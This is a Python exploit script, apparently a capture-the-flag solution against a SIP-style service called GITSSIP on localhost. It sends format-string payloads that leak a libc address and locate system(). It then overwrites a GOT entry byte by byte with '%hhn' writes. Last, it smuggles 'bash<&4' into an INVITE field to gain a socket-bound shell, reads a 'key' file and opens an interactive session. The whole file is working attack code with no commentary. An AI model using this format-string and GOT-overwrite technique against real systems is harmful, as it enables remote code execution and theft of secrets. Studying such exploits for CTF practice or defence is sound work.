import socket
import time
import struct
import telnetlib

inet_addr = 0x6130A8
u64 = lambda x: struct.pack("<Q", x)

s = socket.socket()
address = '127.0.0.1'
port = 5060
s.connect((address, port))

#leak @__libc_start_main+245 address
s.sendall('''REGISTER x GITSSIP/0.1
To: ''' + '%60$p' + '''
From: x
Expires: 0
Common Name: x
Contact: x

DIRECTORY * GITSSIP/0.1
Search: *
''')

time.sleep(0.2)

systemAddr = s.recv(1024)
systemAddr = int(systemAddr[systemAddr.find('0x') : systemAddr.find('0x') + 14], 16) - 0x22fc95
print('@system at ' + hex(systemAddr))

#rewrite got.plt
def writeByte(addr, byte):
	s.sendall('''REGISTER x GITSSIP/0.1
	To: '''.replace('\t', '') + '%%%du%%9$hhn' % (0xe9+ord(byte)) + '''
	From: x
	Expires: 0
	Common Name: xxxxxxx'''.replace('\t', '') + u64(addr) + '''
	Contact: x

	DIRECTORY * GITSSIP/0.1
	Search: *
	'''.replace('\t', ''))
	
for off, byte in enumerate(u64(systemAddr)):
	writeByte(inet_addr + off, byte)

time.sleep(0.2)

s.recv(1024)

#trigger vuln
s.sendall('''INVITE sip:x@bash<&4 GITSSIP/0.1
To: x
Via: x
From: x
Contact: x
Allow: x

exec 0>&4 1>&4
cat key
''')

t = telnetlib.Telnet()
t.sock = s
t.interact()